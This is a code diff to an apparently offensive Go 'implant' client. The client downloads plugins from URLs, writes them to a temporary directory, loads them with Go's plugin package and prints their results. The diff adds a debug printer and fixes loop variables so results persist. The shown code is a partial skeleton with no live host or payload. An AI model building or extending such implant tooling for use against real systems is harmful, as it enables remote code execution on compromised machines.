@@ -8,6 +8,8 @@ import (
 	"strconv"
 )
 
+var PrintDebugMessages bool
+
 type ImplantPlugin struct {
 	PluginId     string //GUID
 	PluginName   string
@@ -23,6 +25,12 @@ type ImplantClient struct {
 	PluginsToRun []ImplantPlugin
 }
 
+func DebugPrinter(msg string) {
+	if PrintDebugMessages {
+		fmt.Println(msg)
+	}
+}
+
 func CheckError(err error) {
 	if err != nil {
 		log.Fatal(err)
@@ -34,14 +42,15 @@ func (implantClient ImplantClient) DownloadPlugin(pluginUrl string) (string, err
 }
 
 func (implantClient ImplantClient) DownloadPlugins() error {
-	for _, pluginDoDownload := range implantClient.PluginsToRun {
+	for idx, pluginToDownload := range implantClient.PluginsToRun {
 		pluginBase64 := ""
+		DebugPrinter("Downloading from " + pluginToDownload.PluginUrl)
 		//Write plugins to temp dir
 		path, err := implantClient.WritePluginToTempDir(pluginBase64)
 		if err != nil {
 			return nil
 		}
-		pluginDoDownload.PluginFile = path
+		implantClient.PluginsToRun[idx].PluginFile = path
 	}
 	return nil
 }
@@ -51,7 +60,7 @@ func (implantClient ImplantClient) WritePluginToTempDir(base64Plugin string) (st
 }
 
 func (implantClient ImplantClient) ExecutePlugins() error {
-	for _, pluginToRun := range implantClient.PluginsToRun {
+	for idx, pluginToRun := range implantClient.PluginsToRun {
 		plugin, err := plugin.Open(pluginToRun.PluginFile)
 		if err != nil {
 			return err
@@ -73,7 +82,7 @@ func (implantClient ImplantClient) ExecutePlugins() error {
 		}
 
 		fmt.Println("RESULT: " + result)
-		pluginToRun.PluginResult = result
+		implantClient.PluginsToRun[idx].PluginResult = result
 	}
 	return nil
 }
@@ -108,6 +117,8 @@ func (implantClient ImplantClient) ClearPluginList() error {
 }
 
 func main() {
+	PrintDebugMessages = true
+
 	if len(os.Args) != 3 {
 		log.Fatal("Missing arguments. Please correct.")
 	}
